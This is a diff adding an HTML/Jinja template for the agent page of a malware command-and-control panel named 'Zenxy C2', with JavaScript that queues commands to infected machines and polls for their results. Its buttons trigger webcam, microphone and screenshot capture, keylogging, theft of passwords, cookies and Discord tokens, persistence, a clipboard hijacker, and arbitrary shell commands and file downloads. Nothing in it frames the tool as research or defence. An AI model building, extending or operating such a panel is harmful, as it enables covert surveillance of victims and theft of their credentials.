@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ agent.hostname }} — Zenxy C2</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body { background: #050505; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(13,13,13,0.75); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.1); }
+        .bg-grid {
+            background-size: 32px 32px;
+            background-image:
+                linear-gradient(to right, rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(255,255,255,0.03) 1px, transparent 1px);
+        }
+        .btn {
+            padding: 0.375rem 0.75rem;
+            border-radius: 0.5rem;
+            background: rgba(255,255,255,0.08);
+            font-size: 0.7rem;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all 0.15s;
+            border: 1px solid transparent;
+        }
+        .btn:hover { background: rgba(255,255,255,0.18); border-color: rgba(255,255,255,0.25); }
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #050505; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+    </style>
+</head>
+<body class="min-h-screen text-white bg-grid">
+    <header class="glass border-b border-white/10 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 h-14 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <a href="/" class="text-gray-400 hover:text-white text-sm"><i class="fa-solid fa-arrow-left"></i></a>
+                <div>
+                    <span class="font-bold text-sm">{{ agent.hostname }}</span>
+                    <span class="text-xs text-gray-500 font-mono ml-2">{{ agent.username }}</span>
+                </div>
+                {% if agent.online %}
+                <span class="ml-2 flex items-center gap-1 text-[10px] font-mono texttext-white">
+                    <span class="w-1.5 h-1.5 rounded-full bg-white shadow-[0_0_6px_#fff]"></span> ONLINE
+                </span>
+                {% else %}
+                <span class="ml-2 text-[10px] font-mono text-gray-500">OFFLINE</span>
+                {% endif %}
+            </div>
+            <div class="text-[10px] font-mono text-gray-500">{{ aid[:20] }}…</div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto px-4 py-6 grid grid-cols-1 lg:grid-cols-12 gap-5">
+        <div class="lg:col-span-4 space-y-4">
+            <div class="glass rounded-2xl p-5">
+                <h3 class="text-[10px] font-mono text-gray-400 tracking-widest uppercase mb-3">System</h3>
+                <div class="space-y-2 text-xs font-mono">
+                    <div class="flex justify-between"><span class="text-gray-500">OS</span><span class="text-right">{{ agent.os }}</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">IP</span><span>{{ agent.ip }}</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Privs</span><span>{{ agent.privileges or 'user' }}</span></div>
+                    <div class="flex justify-between"><span class="text-gray-500">Build</span><span>{{ agent.build or '?' }}</span></div>
+                </div>
+            </div>
+
+            <div class="glass rounded-2xl p-5">
+                <h3 class="text-[10px] font-mono text-gray-400 tracking-widest uppercase mb-3">Surveillance</h3>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="run('screenshot')" class="btn">screenshot</button>
+                    <button onclick="run('screenshot all')" class="btn">ss all</button>
+                    <button onclick="run('webcam')" class="btn">webcam</button>
+                    <button onclick="run('mic 5')" class="btn">mic 5s</button>
+                    <button onclick="run('clipboard')" class="btn">clipboard</button>
+                    <button onclick="run('windows')" class="btn">windows</button>
+                    <button onclick="run('idle')" class="btn">idle</button>
+                    <button onclick="run('geoloc')" class="btn">geoloc</button>
+                    <button onclick="run('keylog dump')" class="btn">keylog dump</button>
+                    <button onclick="run('keylog start')" class="btn">keylog start</button>
+                    <button onclick="run('ssloop start 10')" class="btn">ssloop start</button>
+                    <button onclick="run('ssloop stop')" class="btn">ssloop stop</button>
+                </div>
+            </div>
+
+            <div class="glass rounded-2xl p-5">
+                <h3 class="text-[10px] font-mono text-gray-400 tracking-widest uppercase mb-3">Stealer</h3>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="run('grab passwords')" class="btn">passwords</button>
+                    <button onclick="run('grab cookies')" class="btn">cookies</button>
+                    <button onclick="run('grab discord')" class="btn">discord</button>
+                    <button onclick="run('wifi')" class="btn">wifi</button>
+                    <button onclick="run('grab all')" class="btn col-span-2">grab all</button>
+                </div>
+            </div>
+
+            <div class="glass rounded-2xl p-5">
+                <h3 class="text-[10px] font-mono text-gray-400 tracking-widest uppercase mb-3">System / Control</h3>
+                <div class="grid grid-cols-2 gap-2">
+                    <button onclick="run('info')" class="btn">info</button>
+                    <button onclick="run('processes')" class="btn">processes</button>
+                    <button onclick="run('persist')" class="btn">persist</button>
+                    <button onclick="run('netstat')" class="btn">netstat</button>
+                    <button onclick="run('whoami')" class="btn">whoami</button>
+                    <button onclick="run('pwd')" class="btn">pwd</button>
+                    <button onclick="run('lock')" class="btn">lock</button>
+                    <button onclick="run('clipper start')" class="btn">clipper on</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="lg:col-span-8">
+            <div class="glass rounded-2xl p-5 flex flex-col h-[78vh]">
+                <div class="flex items-center justify-between mb-3">
+                    <h3 class="text-[10px] font-mono text-gray-400 tracking-widest uppercase">Console</h3>
+                    <button onclick="clearOut()" class="text-[10px] font-mono text-gray-500 hover:text-white">clear</button>
+                </div>
+                <div class="flex gap-2 mb-3">
+                    <input id="cmd" type="text" placeholder="shell whoami  |  screenshot  |  grab all  |  download C:\path\file.txt"
+                           class="flex-1 px-3 py-2.5 rounded-xl bg-black border border-white/10 text-sm font-mono focus:outline-none focus:border-white/30"
+                           onkeydown="if(event.key==='Enter')sendCustom()">
+                    <button onclick="sendCustom()" class="px-5 py-2.5 rounded-xl bg-white text-black font-bold text-xs uppercase tracking-wider hover:bg-gray-200">Send</button>
+                </div>
+                <pre id="out" class="flex-1 bg-black/80 rounded-xl p-4 text-xs font-mono text-gray-300 overflow-y-auto border border-white/5 whitespace-pre-wrap"></pre>
+                <div id="imgBox" class="mt-3 hidden">
+                    <img id="imgOut" class="max-w-full rounded-xl border border-white/10" />
+                    <a id="imgDl" href="#" download class="inline-block mt-2 text-[10px] font-mono text-gray-400 hover:text-white">download image</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        const AID = "{{ aid }}";
+        const out = document.getElementById('out');
+        const imgBox = document.getElementById('imgBox');
+        const imgOut = document.getElementById('imgOut');
+        const imgDl = document.getElementById('imgDl');
+
+        function log(msg) {
+            out.innerText += msg + "\n";
+            out.scrollTop = out.scrollHeight;
+        }
+        function clearOut() {
+            out.innerText = "";
+            imgBox.classList.add('hidden');
+        }
+        async function run(cmd) {
+            log("> " + cmd);
+            try {
+                const res = await fetch('/api/task', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({agent_id: AID, cmd: cmd})
+                });
+                const data = await res.json();
+                if (data.task_id) {
+                    log("[queued] " + data.task_id);
+                    pollResult(data.task_id);
+                } else log("[error] " + JSON.stringify(data));
+            } catch (e) { log("[error] " + e); }
+        }
+        function sendCustom() {
+            const v = document.getElementById('cmd').value.trim();
+            if (!v) return;
+            document.getElementById('cmd').value = '';
+            run(v);
+        }
+        async function pollResult(tid, tries = 0) {
+            if (tries > 50) { log("[timeout] " + tid); return; }
+            try {
+                const res = await fetch('/api/result/' + tid);
+                const data = await res.json();
+                if (data.status === 'pending') {
+                    setTimeout(() => pollResult(tid, tries + 1), 1400);
+                    return;
+                }
+                if (data.type === 'image' && data.file_id) {
+                    const url = '/api/file/' + data.file_id + '/view';
+                    imgOut.src = url;
+                    imgDl.href = '/api/file/' + data.file_id;
+                    imgBox.classList.remove('hidden');
+                    log("[image] received — " + (data.filename || ''));
+                } else if (data.type === 'file' && data.file_id) {
+                    log("[file] " + (data.filename || 'file') + " ready");
+                    const a = document.createElement('a');
+                    a.href = '/api/file/' + data.file_id;
+                    a.download = data.filename || 'file.bin';
+                    a.className = 'text-white underline text-xs';
+                    a.innerText = ' [download ' + (data.filename || 'file') + ']';
+                    out.appendChild(a);
+                    out.innerText += "\n";
+                } else {
+                    log(data.output || "[empty]");
+                }
+            } catch (e) { log("[poll error] " + e); }
+        }
+    </script>
+</body>
+</html>
